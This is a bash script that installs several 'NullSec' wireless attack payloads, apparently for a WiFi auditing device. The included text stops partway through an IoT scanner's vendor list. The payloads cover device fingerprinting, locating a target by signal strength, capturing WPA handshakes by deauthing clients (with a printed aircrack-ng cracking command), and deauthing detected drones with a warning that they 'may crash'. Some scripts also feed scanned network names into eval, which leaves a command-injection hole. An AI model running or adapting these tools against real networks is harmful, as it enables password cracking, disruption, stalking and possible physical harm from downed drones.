#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Payload Fixer Part 2 - Fix remaining payloads with specific bugs
#═══════════════════════════════════════════════════════════════════════════════

SUITE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/nullsec-suite"
echo "[*] Fixing remaining payloads in: $SUITE_DIR"
FIXED=0

##############################################################################
# 1. DeviceFingerprint - Fix: use wlan1mon, fix summary display, add cleanup
##############################################################################
cat > "$SUITE_DIR/DeviceFingerprint/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Device Fingerprint
# Author: bad-antics
# Description: Identify device types from MAC addresses and probes
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/fingerprints"
mkdir -p "$LOOT_DIR"

PROMPT "DEVICE FINGERPRINTER

Identify device types:
- Apple (iPhone/Mac/iPad)
- Samsung Galaxy
- Google/Nest
- Amazon Echo/Fire
- Intel/Windows
- Cisco/Networking

Press OK to scan."

# Use existing monitor interface (don't touch management radio)
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan duration (sec):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

REPORT="$LOOT_DIR/fingerprint_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "START SCAN?

Interface: $MON_IF
Duration: ${DURATION}s
Output: $REPORT

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning devices..."

rm -f /tmp/fpscan* /tmp/fp_probes.txt /tmp/all_macs.txt
timeout "$DURATION" airodump-ng "$MON_IF" --write-interval 5 -w /tmp/fpscan --output-format csv 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

echo "==========================================" > "$REPORT"
echo "       NULLSEC DEVICE FINGERPRINTS        " >> "$REPORT"
echo "==========================================" >> "$REPORT"
echo "Scan Time: $(date)" >> "$REPORT"
echo "Interface: $MON_IF" >> "$REPORT"
echo "" >> "$REPORT"

grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/fpscan*.csv 2>/dev/null | sort -u > /tmp/all_macs.txt

APPLE=0; SAMSUNG=0; GOOGLE=0; MICROSOFT=0; AMAZON=0; INTEL=0; CISCO=0; OTHER=0

echo "--- DEVICE IDENTIFICATION ---" >> "$REPORT"
echo "" >> "$REPORT"

while read MAC; do
    PREFIX=$(echo "$MAC" | cut -d':' -f1-3 | tr '[:lower:]' '[:upper:]')

    case $PREFIX in
        00:0A:95|00:1C:B3|00:03:93|00:17:F2|AC:DE:48|3C:06:30|00:23:12|FC:FC:48|00:26:BB|70:56:81|40:33:1A|A4:D1:8C|00:1E:C2|64:20:0C|78:CA:39|00:0D:93|88:D7:F6|9C:20:7B|D0:5F:B8)
            echo "APPLE: $MAC" >> "$REPORT"; APPLE=$((APPLE + 1)) ;;
        00:26:5E|00:1A:8A|00:12:47|00:15:99|00:1D:F6|00:21:D2|00:24:91|00:26:37|5C:0A:5B|84:25:DB|E4:7C:F9|78:D6:F0|94:51:03)
            echo "SAMSUNG: $MAC" >> "$REPORT"; SAMSUNG=$((SAMSUNG + 1)) ;;
        00:1A:11|3C:5A:B4|54:60:09|94:EB:2C|F4:F5:D8|20:DF:B9|30:FD:38|18:B4:30|64:16:66)
            echo "GOOGLE: $MAC" >> "$REPORT"; GOOGLE=$((GOOGLE + 1)) ;;
        00:0D:3A|00:12:5A|00:15:5D|00:17:FA|00:1D:D8|28:18:78|60:45:BD|7C:1E:52|B4:AE:2B|DC:53:60|00:50:F2)
            echo "MICROSOFT: $MAC" >> "$REPORT"; MICROSOFT=$((MICROSOFT + 1)) ;;
        00:FC:8B|0C:47:C9|18:74:2E|34:D2:70|40:B4:CD|44:65:0D|68:54:FD|74:C2:46|A0:02:DC|FC:A6:67|B0:FC:36|68:37:E9|50:DC:E7)
            echo "AMAZON: $MAC" >> "$REPORT"; AMAZON=$((AMAZON + 1)) ;;
        00:1B:21|00:1C:BF|00:1D:E0|00:1E:64|00:1F:3B|00:21:5C|00:22:FA|00:24:D6|3C:97:0E|5C:51:4F|64:D4:DA|80:86:F2|88:53:2E|A0:88:B4|C8:0A:A9|F4:8E:38)
            echo "INTEL: $MAC" >> "$REPORT"; INTEL=$((INTEL + 1)) ;;
        00:0C:29|00:50:56|00:0C:76|00:40:96|00:50:0F|00:17:94|00:21:1C|00:24:C3|00:18:74|00:22:55|18:33:9D|F4:CF:E2)
            echo "CISCO/VMWARE: $MAC" >> "$REPORT"; CISCO=$((CISCO + 1)) ;;
        *)
            echo "OTHER: $MAC" >> "$REPORT"; OTHER=$((OTHER + 1)) ;;
    esac
done < /tmp/all_macs.txt

TOTAL=$((APPLE + SAMSUNG + GOOGLE + MICROSOFT + AMAZON + INTEL + CISCO + OTHER))

echo "" >> "$REPORT"
echo "==========================================" >> "$REPORT"
printf "SUMMARY:\n  Apple: %d\n  Samsung: %d\n  Google: %d\n  Microsoft: %d\n  Amazon: %d\n  Intel: %d\n  Cisco: %d\n  Other: %d\n  TOTAL: %d\n" \
    "$APPLE" "$SAMSUNG" "$GOOGLE" "$MICROSOFT" "$AMAZON" "$INTEL" "$CISCO" "$OTHER" "$TOTAL" >> "$REPORT"
echo "==========================================" >> "$REPORT"

rm -f /tmp/fpscan* /tmp/fp_probes.txt /tmp/all_macs.txt

PROMPT "FINGERPRINTING COMPLETE

Total: $TOTAL devices

Apple: $APPLE  Samsung: $SAMSUNG
Google: $GOOGLE  Amazon: $AMAZON
Microsoft: $MICROSOFT
Intel: $INTEL  Cisco: $CISCO
Other: $OTHER

Report: $REPORT"
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 2. DroneHunter - Fix: use wlan1mon, don't call airmon-ng check kill
##############################################################################
cat > "$SUITE_DIR/DroneHunter/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Drone Hunter
# Author: bad-antics
# Description: Detect and identify nearby drones by WiFi
# Category: nullsec/recon

DRONE_OUIS="60:60:1F:DJI
34:D2:62:DJI
48:1C:B9:DJI
60:B6:47:DJI
E0:49:4C:DJI
40:1C:A8:Parrot
90:03:B7:Parrot
A0:14:3D:Parrot
00:12:1C:Parrot
00:26:7E:Parrot
94:51:03:Autel
90:3A:E6:Autel
2C:41:A1:Yuneec
60:A4:4C:Skydio
9C:4E:36:Holy_Stone
A0:C9:A0:Syma
4C:49:E3:Autel"

DRONE_SSIDS="Spark-|Mavic-|Phantom|TELLO-|Anafi-|Bebop|PARROT|DJI|Skydio|YUNEEC|AUTEL"

PROMPT "DRONE HUNTER

Detect drones by their
WiFi signatures.

Identifies DJI, Parrot,
Autel, Yuneec, and more.

Press OK to configure."

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan time (sec):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START DRONE SCAN?

Interface: $MON_IF
Duration: ${DURATION}s

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning for drones..."

TEMP_DIR="/tmp/dronehunt_$$"
mkdir -p "$TEMP_DIR"
rm -f /tmp/dronehunt_*
timeout "$DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

LOOT_DIR="/mmc/nullsec/drones"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/drones_$(date +%Y%m%d_%H%M%S).txt"

echo "Drone Hunter Results" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "Interface: $MON_IF" >> "$LOOT_FILE"
echo "Scan Duration: ${DURATION}s" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

if [ -f "$TEMP_DIR/scan-01.csv" ]; then
    while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
        ESSID=$(echo "$ESSID" | sed 's/^[[:space:]]*//')

        [[ ! "$BSSID" =~ ^[0-9A-Fa-f]{2}: ]] && continue

        OUI=$(echo "$BSSID" | cut -d':' -f1-3)

        DRONE_TYPE=""
        MATCH=$(echo "$DRONE_OUIS" | grep -i "^$OUI" | head -1 | awk -F: '{print $4}')
        [ -n "$MATCH" ] && DRONE_TYPE="$MATCH"

        if [ -z "$DRONE_TYPE" ] && [ -n "$ESSID" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
            if echo "$ESSID" | grep -qi "DJI\|Spark\|Mavic\|Phantom\|TELLO"; then
                DRONE_TYPE="DJI"
            elif echo "$ESSID" | grep -qi "Parrot\|Anafi\|Bebop"; then
                DRONE_TYPE="Parrot"
            elif echo "$ESSID" | grep -qi "AUTEL"; then
                DRONE_TYPE="Autel"
            elif echo "$ESSID" | grep -qi "YUNEEC"; then
                DRONE_TYPE="Yuneec"
            elif echo "$ESSID" | grep -qi "Skydio"; then
                DRONE_TYPE="Skydio"
            else
                DRONE_TYPE="Unknown_Drone"
            fi
        fi

        if [ -n "$DRONE_TYPE" ]; then
            echo "" >> "$LOOT_FILE"
            echo "DRONE DETECTED!" >> "$LOOT_FILE"
            echo "  Type: $DRONE_TYPE" >> "$LOOT_FILE"
            echo "  BSSID: $BSSID" >> "$LOOT_FILE"
            echo "  SSID: $ESSID" >> "$LOOT_FILE"
            echo "  Channel: $(echo $CHANNEL | tr -d ' ')" >> "$LOOT_FILE"
            echo "  Signal: $(echo $POWER | tr -d ' ') dBm" >> "$LOOT_FILE"
            FOUND=$((FOUND + 1))
        fi
    done < "$TEMP_DIR/scan-01.csv"
fi

rm -rf "$TEMP_DIR"

if [ "$FOUND" -gt 0 ]; then
    PROMPT "DRONES FOUND: $FOUND

Check $LOOT_FILE
for details.

Press OK to continue."

    resp=$(CONFIRMATION_DIALOG "DEAUTH DRONES?

Disconnect $FOUND drones
from controllers.

WARNING: Drone may crash!

Confirm?")

    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "Deauthing drones..."
        grep "BSSID:" "$LOOT_FILE" | sed 's/.*BSSID: //' | tr -d ' ' | while read DRONE_MAC; do
            [ -n "$DRONE_MAC" ] && timeout 15 aireplay-ng --deauth 50 -a "$DRONE_MAC" "$MON_IF" 2>/dev/null &
        done
        sleep 15
        killall aireplay-ng 2>/dev/null

        PROMPT "DEAUTH COMPLETE

All detected drones
have been targeted.

Press OK to exit."
    fi
else
    PROMPT "NO DRONES FOUND

No drone WiFi signals
detected in ${DURATION}s.

Try longer scan or
different location.

Press OK to exit."
fi
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 3. SignalTracker - Fix: use wlan1mon, fix signal capture, add loot
##############################################################################
cat > "$SUITE_DIR/SignalTracker/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Signal Tracker
# Author: bad-antics
# Description: Track signal strength to locate WiFi sources
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/signaltrack"
mkdir -p "$LOOT_DIR"

PROMPT "SIGNAL TRACKER

Track WiFi signal strength
to physically locate
access points or clients.

Useful for finding hidden
devices or rogue APs.

Press OK to configure."

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "TRACK MODE:

1. Track Access Point
2. Track Client Device

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1=AP 2=Client):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

SPINNER_START "Quick scan..."

TEMP_DIR="/tmp/sigtrack_$$"
mkdir -p "$TEMP_DIR"
rm -f /tmp/sigtrack_*
timeout 10 airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep 10
killall airodump-ng 2>/dev/null

SPINNER_STOP

if [ "$MODE" = "1" ]; then
    NET_COUNT=0; NETS=""
    if [ -f "$TEMP_DIR/scan-01.csv" ]; then
        while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
            [ -z "$essid" ] && essid="[Hidden]"
            NET_COUNT=$((NET_COUNT + 1))
            NETS="${NETS}${NET_COUNT}. ${essid}\n"
            eval "BSSID_${NET_COUNT}=\"$bssid\""
            eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
            [ $NET_COUNT -ge 10 ] && break
        done < "$TEMP_DIR/scan-01.csv"
    fi
    [ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No APs found!"; rm -rf "$TEMP_DIR"; exit 1; }
    PROMPT "APs FOUND: $NET_COUNT\n\n$(echo -e "$NETS")\nSelect target."
    SEL=$(NUMBER_PICKER "AP # (1-$NET_COUNT):" 1)
    eval "TARGET=\"\$BSSID_${SEL}\""
    eval "CHANNEL=\"\$CH_${SEL}\""
else
    TARGET=$(MAC_PICKER "Client MAC to track:")
    CHANNEL=$(NUMBER_PICKER "Channel:" 6)
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac
fi

[ -z "$TARGET" ] && { ERROR_DIALOG "No target specified!"; exit 1; }

TRACK_SECS=$(NUMBER_PICKER "Track duration (sec):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TRACK_SECS=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START TRACKING?

Target: $TARGET
Channel: $CHANNEL
Duration: ${TRACK_SECS}s

Move around to locate.
Higher signal = closer.

Press OK to track.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -rf "$TEMP_DIR"; exit 0; }

iwconfig "$MON_IF" channel "$CHANNEL" 2>/dev/null

LOG_FILE="$LOOT_DIR/track_$(date +%Y%m%d_%H%M).txt"
echo "Signal Tracking: $TARGET on CH:$CHANNEL" > "$LOG_FILE"

LOG "Tracking $TARGET on CH:$CHANNEL..."

# Track using repeated short airodump scans
ITERATIONS=$((TRACK_SECS / 3))
[ "$ITERATIONS" -lt 5 ] && ITERATIONS=5

LAST_SIGNAL=""
for i in $(seq 1 "$ITERATIONS"); do
    rm -f /tmp/sigpoll*
    timeout 2 airodump-ng "$MON_IF" -c "$CHANNEL" --bssid "$TARGET" -w /tmp/sigpoll --output-format csv 2>/dev/null &
    sleep 2
    killall airodump-ng 2>/dev/null

    SIGNAL=""
    if [ -f /tmp/sigpoll-01.csv ]; then
        SIGNAL=$(grep "$TARGET" /tmp/sigpoll-01.csv 2>/dev/null | head -1 | awk -F',' '{print $9}' | tr -d ' ')
    fi

    if [ -n "$SIGNAL" ] && [ "$SIGNAL" != "0" ]; then
        ABS_SIG=${SIGNAL#-}
        if [ "$ABS_SIG" -lt 50 ] 2>/dev/null; then
            BARS="█████ VERY CLOSE!"
        elif [ "$ABS_SIG" -lt 60 ]; then
            BARS="████░ CLOSE"
        elif [ "$ABS_SIG" -lt 70 ]; then
            BARS="███░░ MEDIUM"
        elif [ "$ABS_SIG" -lt 80 ]; then
            BARS="██░░░ FAR"
        else
            BARS="█░░░░ VERY FAR"
        fi
        LOG "${SIGNAL}dBm $BARS"
        echo "$(date +%H:%M:%S) ${SIGNAL}dBm $BARS" >> "$LOG_FILE"
        LAST_SIGNAL="$SIGNAL"
    else
        LOG "No signal..."
    fi
    rm -f /tmp/sigpoll*
done

rm -rf "$TEMP_DIR"

PROMPT "TRACKING COMPLETE

Target: $TARGET
Last Signal: ${LAST_SIGNAL:-N/A}dBm
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 4. HandshakeHunter - Fix: use wlan1mon, add monitor mode awareness
##############################################################################
cat > "$SUITE_DIR/HandshakeHunter/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Handshake Hunter
# Author: bad-antics
# Description: Targeted WPA handshake capture
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "HANDSHAKE HUNTER

Capture WPA handshakes
from a specific network.

Methods:
- Passive (wait for client)
- Active (deauth clients)
- Targeted (specific client)

Press OK to configure."

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

PROMPT "TARGET SELECTION:

1. Scan and select
2. Enter BSSID manually

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-2):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning for WPA networks..."
    rm -f /tmp/hsscan*
    timeout 12 airodump-ng "$MON_IF" -w /tmp/hsscan --output-format csv 2>/dev/null &
    sleep 12
    killall airodump-ng 2>/dev/null
    SPINNER_STOP

    NET_COUNT=0; NETS=""
    if [ -f /tmp/hsscan-01.csv ]; then
        while IFS=',' read -r bssid x1 x2 channel x3 privacy x5 x6 power x7 x8 x9 x10 essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            privacy=$(echo "$privacy" | tr -d ' ')
            [[ ! "$privacy" =~ WPA ]] && continue
            essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
            [ -z "$essid" ] && essid="[Hidden]"
            channel=$(echo "$channel" | tr -d ' ')
            NET_COUNT=$((NET_COUNT + 1))
            NETS="${NETS}${NET_COUNT}. ${essid} CH:${channel}\n"
            eval "BSSID_${NET_COUNT}=\"$bssid\""
            eval "CH_${NET_COUNT}=\"$channel\""
            eval "ESSID_${NET_COUNT}=\"$essid\""
            [ $NET_COUNT -ge 10 ] && break
        done < /tmp/hsscan-01.csv
    fi
    rm -f /tmp/hsscan*
    [ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No WPA networks found!"; exit 1; }

    PROMPT "WPA NETWORKS: $NET_COUNT

$(echo -e "$NETS")
Select target next."

    SEL=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
    eval "BSSID=\"\$BSSID_${SEL}\""
    eval "CHANNEL=\"\$CH_${SEL}\""
    eval "SSID=\"\$ESSID_${SEL}\""
else
    BSSID=$(MAC_PICKER "Target BSSID:")
    CHANNEL=$(NUMBER_PICKER "Channel:" 6)
    SSID=$(TEXT_PICKER "Network name:" "target")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="target" ;; esac
fi

PROMPT "CAPTURE METHOD:

1. Passive (just wait)
2. Deauth all clients
3. Target specific client

Select method next."

METHOD=$(NUMBER_PICKER "Method (1-3):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=2 ;; esac

CLIENT_MAC=""
if [ "$METHOD" -eq 3 ]; then
    CLIENT_MAC=$(MAC_PICKER "Client MAC to deauth:")
fi

DURATION=$(NUMBER_PICKER "Max duration (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

SAFE_SSID=$(echo "$SSID" | tr -cd '[:alnum:]_-')
CAP_FILE="$LOOT_DIR/hs_${SAFE_SSID}_$(date +%Y%m%d_%H%M)"

resp=$(CONFIRMATION_DIALOG "START CAPTURE?

SSID: $SSID
BSSID: $BSSID
Channel: $CHANNEL
Method: $METHOD

Press OK to hunt.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Hunting handshake for $SSID..."

iwconfig "$MON_IF" channel "$CHANNEL" 2>/dev/null

# Start capture in background
airodump-ng "$MON_IF" --bssid "$BSSID" -c "$CHANNEL" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
CAP_PID=$!
sleep 3

CAPTURED=0
case $METHOD in
    2)
        for round in 1 2 3 4; do
            aireplay-ng -0 5 -a "$BSSID" "$MON_IF" 2>/dev/null
            sleep 10
            if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                CAPTURED=1
                break
            fi
        done
        ;;
    3)
        for round in 1 2 3 4; do
            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" "$MON_IF" 2>/dev/null
            sleep 10
            if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                CAPTURED=1
                break
            fi
        done
        ;;
    *)
        sleep "$DURATION"
        if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
            CAPTURED=1
        fi
        ;;
esac

kill $CAP_PID 2>/dev/null
killall airodump-ng 2>/dev/null

if [ "$CAPTURED" -eq 1 ]; then
    PROMPT "SUCCESS!

Handshake captured!
SSID: $SSID
File: ${CAP_FILE}-01.cap

Crack with:
aircrack-ng -w wordlist.txt ${CAP_FILE}-01.cap

Press OK to exit."
else
    PROMPT "NO HANDSHAKE

Could not capture for:
$SSID

Try:
- Active deauth method
- Longer duration
- More clients nearby

Press OK to exit."
fi
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 5. VendorHunt - Fix: use wlan1mon, fix custom OUI, fix grep matching
##############################################################################
cat > "$SUITE_DIR/VendorHunt/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Vendor Hunt
# Author: bad-antics
# Description: Find devices by manufacturer
# Category: nullsec/recon

# OUI database (manufacturer:prefix pairs)
declare -A OUI_MAP
# Apple
for p in 00:0A:95 00:1C:B3 00:03:93 00:17:F2 AC:DE:48 3C:06:30 00:23:12 FC:FC:48 00:26:BB 70:56:81 40:33:1A A4:D1:8C 00:1E:C2 64:20:0C 78:CA:39 00:0D:93; do
    OUI_MAP["$p"]="Apple"
done
# Samsung
for p in 00:26:5E 00:1A:8A 00:12:47 00:15:99 00:1D:F6 00:21:D2 00:24:91 00:26:37 5C:0A:5B 84:25:DB E4:7C:F9 78:D6:F0; do
    OUI_MAP["$p"]="Samsung"
done
# Amazon
for p in 00:17:FA 40:B4:CD 44:65:0D 68:54:FD 74:C2:46 A0:02:DC FC:A6:67 18:74:2E B0:FC:36 68:37:E9 50:DC:E7 00:FC:8B; do
    OUI_MAP["$p"]="Amazon"
done
# Google
for p in 00:1A:11 3C:5A:B4 54:60:09 94:EB:2C F4:F5:D8 20:DF:B9 30:FD:38 18:B4:30 64:16:66; do
    OUI_MAP["$p"]="Google"
done
# Cisco
for p in 00:0C:76 00:40:96 00:50:0F 00:17:94 00:21:1C 00:24:C3 00:18:74 00:22:55 18:33:9D F4:CF:E2; do
    OUI_MAP["$p"]="Cisco"
done
# Raspberry Pi
for p in B8:27:EB DC:A6:32 E4:5F:01 28:CD:C1 D8:3A:DD; do
    OUI_MAP["$p"]="Raspberry_Pi"
done
# Microsoft
for p in 00:0D:3A 00:12:5A 00:15:5D 00:50:F2 28:18:78 60:45:BD; do
    OUI_MAP["$p"]="Microsoft"
done

PROMPT "VENDOR HUNT

Find devices by their
manufacturer (Apple,
Samsung, Cisco, etc).

Press OK to configure."

PROMPT "TARGET VENDOR:

1. Apple
2. Samsung
3. Amazon
4. Google/Nest
5. Cisco
6. Raspberry Pi
7. All vendors
8. Custom OUI prefix

Select on next screen."

VENDOR_CHOICE=$(NUMBER_PICKER "Vendor (1-8):" 7)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) VENDOR_CHOICE=7 ;; esac

VENDOR_FILTER=""
CUSTOM_OUI=""
case $VENDOR_CHOICE in
    1) VENDOR_FILTER="Apple" ;;
    2) VENDOR_FILTER="Samsung" ;;
    3) VENDOR_FILTER="Amazon" ;;
    4) VENDOR_FILTER="Google" ;;
    5) VENDOR_FILTER="Cisco" ;;
    6) VENDOR_FILTER="Raspberry_Pi" ;;
    7) VENDOR_FILTER="" ;;
    8) CUSTOM_OUI=$(TEXT_PICKER "OUI prefix (XX:XX:XX):" "B8:27:EB")
       VENDOR_FILTER="CUSTOM" ;;
esac

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan duration (sec):" 20)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=20 ;; esac

resp=$(CONFIRMATION_DIALOG "START VENDOR HUNT?

Vendor: ${VENDOR_FILTER:-All}
Interface: $MON_IF
Duration: ${DURATION}s

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Hunting ${VENDOR_FILTER:-all} devices..."

TEMP_DIR="/tmp/vendorhunt_$$"
mkdir -p "$TEMP_DIR"
rm -f /tmp/vendorhunt_*
timeout "$DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

LOOT_DIR="/mmc/nullsec/vendor_hunt"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/${VENDOR_FILTER:-all}_$(date +%Y%m%d_%H%M%S).txt"

echo "Vendor Hunt: ${VENDOR_FILTER:-All Vendors}" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

if [ -f "$TEMP_DIR/scan-01.csv" ]; then
    # Extract all MACs from the scan
    grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$TEMP_DIR/scan-01.csv" 2>/dev/null | sort -u | while read MAC; do
        OUI=$(echo "$MAC" | cut -d':' -f1-3 | tr '[:lower:]' '[:upper:]')

        MATCHED_VENDOR=""
        if [ "$VENDOR_FILTER" = "CUSTOM" ]; then
            CUSTOM_UPPER=$(echo "$CUSTOM_OUI" | tr '[:lower:]' '[:upper:]')
            [ "$OUI" = "$CUSTOM_UPPER" ] && MATCHED_VENDOR="Custom($CUSTOM_OUI)"
        elif [ -n "${OUI_MAP[$OUI]+x}" ]; then
            MATCHED_VENDOR="${OUI_MAP[$OUI]}"
            if [ -n "$VENDOR_FILTER" ] && [ "$MATCHED_VENDOR" != "$VENDOR_FILTER" ]; then
                continue
            fi
        else
            [ -n "$VENDOR_FILTER" ] && [ "$VENDOR_FILTER" != "" ] && continue
            MATCHED_VENDOR="Unknown"
        fi

        [ -z "$MATCHED_VENDOR" ] && continue
        echo "$MATCHED_VENDOR: $MAC" >> "$LOOT_FILE"
        FOUND=$((FOUND + 1))
    done
fi

# Count from file since the while loop was in a subshell
FOUND=$(grep -c ": " "$LOOT_FILE" 2>/dev/null || echo 0)
FOUND=$((FOUND - 1))  # subtract header line
[ "$FOUND" -lt 0 ] && FOUND=0

rm -rf "$TEMP_DIR"

PROMPT "VENDOR HUNT COMPLETE

Found: $FOUND devices
Filter: ${VENDOR_FILTER:-All}
Results: $LOOT_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 6. IoTScanner - Fix: use wlan1mon, fix FOUND subshell bug
##############################################################################
cat > "$SUITE_DIR/IoTScanner/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: IoT Scanner
# Author: bad-antics
# Description: Discover and fingerprint IoT devices
# Category: nullsec/recon

PROMPT "IOT SCANNER

Discover smart devices:
- Smart TVs & Speakers
- Cameras & Doorbells
- Smart plugs & Lights
- Voice assistants

Press OK to configure."

LOOT_DIR="/mmc/nullsec/iot"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/iot_$(date +%Y%m%d_%H%M%S).txt"

# IoT OUI database
IOT_OUIS="18:B4:30:Nest
64:16:66:Nest
F4:F5:D8:Google_Home
20:DF:B9:Google_Home
30:FD:38:Google_Home
48:D6:D5:Amazon_Echo
50:DC:E7:Amazon
68:37:E9:Amazon
FC:65:DE:Amazon
44:65:0D:Amazon
00:FC:8B:Amazon
00:17:88:Philips_Hue
EC:B5:FA:Philips_Hue
00:24:88:Ring
9C:02:98:Ring
50:14:79:TP-Link
B0:BE:76:TP-Link
60:01:94:TP-Link
D8:0D:17:TP-Link
70:4F:57:TP-Link
